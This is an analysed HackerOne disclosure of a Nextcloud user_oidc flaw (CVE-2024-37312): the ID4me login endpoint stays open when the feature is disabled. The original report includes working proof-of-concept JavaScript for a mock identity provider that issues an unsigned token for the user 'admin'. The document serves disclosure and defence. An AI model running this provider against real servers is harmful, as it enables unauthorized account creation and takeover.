# ID4me OpenID Connect Feature Accessible Despite Disabled Configuration

## Metadata
- **Source:** HackerOne
- **Report:** 2376929 | https://hackerone.com/reports/2376929
- **Submitted:** 2024-02-17
- **Reporter:** lukasreschke
- **Program:** Nextcloud
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Authentication Bypass, Access Control Bypass, Improper Input Validation, Configuration Weakness
- **CVEs:** CVE-2024-37312
- **Category:** uncategorised

## Summary
The Nextcloud user_oidc app allows unauthenticated users to access the ID4me authentication endpoint at /apps/user_oidc/id4me regardless of whether the ID4me feature is disabled in settings. An attacker can leverage this to create arbitrary user accounts, including privileged ones, by spoofing or controlling an ID4Me identity provider.

## Attack scenario
1. Attacker identifies a Nextcloud instance with user_oidc app installed and determines the ID4Me feature is disabled via UI
2. Attacker directly navigates to /apps/user_oidc/id4me endpoint which remains accessible despite disabled configuration
3. Attacker sets up a malicious or test ID4Me identity provider (e.g., id4me.cloud.wtf) or controls an existing one
4. Attacker initiates authentication flow and registers a new account, potentially with admin username if account creation allows it
5. Attacker gains unauthorized access to the Nextcloud instance and can access instance-wide resources like Nextcloud Talk chat rooms
6. Attacker escalates privileges or performs further reconnaissance within the instance

## Root cause
The ID4Me authentication controller remains registered and functional in the routing even when the feature is disabled via configuration. The disable setting only hides the login UI button but does not prevent direct endpoint access or implement authorization checks. No backend validation exists to enforce the disabled state.

## Attacker mindset
An attacker would recognize this as a simple-to-exploit misconfiguration where client-side UI controls (hiding a button) do not correlate with backend access controls. They would perceive the direct endpoint access as an unprotected feature allowing account registration without proper authentication, enabling unauthorized account creation and system compromise.

## Defensive takeaways
- Always implement server-side enforcement of feature flags/disabled settings, not just UI hiding
- Add authorization middleware that checks feature configuration before allowing controller access
- Implement explicit access control checks in authentication handlers for optional authentication methods
- Separate controller registration based on configuration state or add route guards that validate enabled status
- Audit all entry points to authentication flows to ensure disabled features are completely inaccessible
- Regularly test disabled features by attempting direct endpoint access to verify they are actually disabled

## Variant hunting
Check if other OIDC provider endpoints (Google, Microsoft, etc.) in user_oidc app have similar bypass issues
Test if disabling the entire user_oidc app is also bypassable through direct endpoint access
Examine if other optional authentication apps in Nextcloud have UI-only disable implementations
Review Nextcloud Talk and other apps for similar feature-disabling logic that may be bypassable
Test if related functionality like user account deletion or profile modification respects disabled configurations
Look for other /apps/*/id4me-like endpoints that might be accessible without proper authorization

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1078: Valid Accounts
- T1556: Modify Authentication Process
- T1589: Gather Victim Identity Information
- T1566: Phishing
- T1199: Trusted Relationship

## Notes
The vulnerability is particularly severe because: (1) It allows unauthenticated account creation, (2) The attacker only needs network access to the Nextcloud instance, (3) It bypasses intended access controls entirely, (4) The reporter demonstrated proof-of-concept with a minimal mock ID4Me server. The severity is amplified by subsequent access to instance-wide features like Nextcloud Talk. This is a classic case of UI-based access control (security theater) rather than proper backend enforcement.

## Full report
<details><summary>Expand</summary>

## Summary:
It is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user. This is especially problematic given apps such as Nextcloud Talk enable accessing instance wide chat rooms.

This is caused since the setting to enable/disable ID4ME has no effect at all except hiding the button on the login site. The controllers are however still accessible.

## Steps To Reproduce:

  1. Install user_oidc
  1. Open http://localhost:8080/apps/user_oidc/id4me
  1. As domain choose `id4me.cloud.wtf` which is a small test server that I've created running the below code
  1. Be logged in as new user on the instance.
 
## Supporting Material/References:

For reference purposes, this is the server running the `id4me.cloud.wtf` ID4Me dummy server:

```js
export default {
  async fetch(request, env, ctx) {
    const { pathname } = new URL(request.url);
    //return new Response("disabled");

    if(pathname == "/.well-known/openid-configuration") {
      return new Response('{"issuer":"https://id4me2.cloud.wtf","authorization_endpoint":"https://id4me2.cloud.wtf/auth","token_endpoint":"https://id4me2.cloud.wtf/token","token_introspection_endpoint":"https://id4me2.cloud.wtf/token/introspect","userinfo_endpoint":"https://id4me2.cloud.wtf/userinfo","end_session_endpoint":"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/logout","jwks_uri":"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/certs","check_session_iframe":"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/login-status-iframe.html","grant_types_supported":["authorization_code","implicit","refresh_token","password","client_credentials"],"response_types_supported":["code","none","id_token","token","id_token token","code id_token","code token","code id_token token"],"subject_types_supported":["public","pairwise"],"id_token_signing_alg_values_supported":["ES384","RS384","HS256","HS512","ES256","RS256","HS384","ES512","RS512"],"userinfo_signing_alg_values_supported":["ES384","RS384","HS256","HS512","ES256","RS256","HS384","ES512","RS512","none"],"request_object_signing_alg_values_supported":["ES384","RS384","ES256","RS256","ES512","RS512","none"],"response_modes_supported":["query","fragment","form_post"],"registration_endpoint":"https://id4me2.cloud.wtf/register","token_endpoint_auth_methods_supported":["private_key_jwt","client_secret_basic","client_secret_post","client_secret_jwt"],"token_endpoint_auth_signing_alg_values_supported":["RS256"],"claims_supported":["sub","iss","auth_time","name","given_name","family_name","preferred_username","email"],"claim_types_supported":["normal"],"claims_parameter_supported":false,"scopes_supported":["openid","profile","roles","phone","offline_access","address","web-origins","email","jpberlin"],"request_parameter_supported":true,"request_uri_parameter_supported":true,"code_challenge_methods_supported":["plain","S256"],"tls_client_certificate_bound_access_tokens":true,"introspection_endpoint":"https://id4me2.cloud.wtf/introspect"}');
    }
    if(pathname == "/register") {
      return new Response('{"client_name": "id4me2.cloud.wtf", "client_id": "id4me2.cloud.wtf", "client_secret": "1234", "client_secret_expires_at": 1921684352, "redirect_uris": ["id4m2.cloud.wtf"], "userinfo_signed_response_alg": ""}');
    }
    if(pathname == "/auth") {
      const { searchParams } = new URL(request.url);
      let redirect_uri = searchParams.get('redirect_uri');
      let state = searchParams.get('state');
      let code = searchParams.get('nonce');

      return Response.redirect(redirect_uri + "?state=" + state + "&code=" + code, 307);
    }
    if(pathname == "/token") {
      let header = btoa(JSON.stringify({  }));
      let payload = btoa(JSON.stringify({ "aud": "id4me2.cloud.wtf", "sub": "admin", "exp": 1771290271 }));

      let fullResponse = JSON.stringify({"id_token": header + "." + payload + ".signature"});
      return new Response(fullResponse);
    }

    return new Response('Hello World!');
  },
};
```

## Impact

It is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user.

</details>

---
*Analysed by Claude on 2026-05-24*
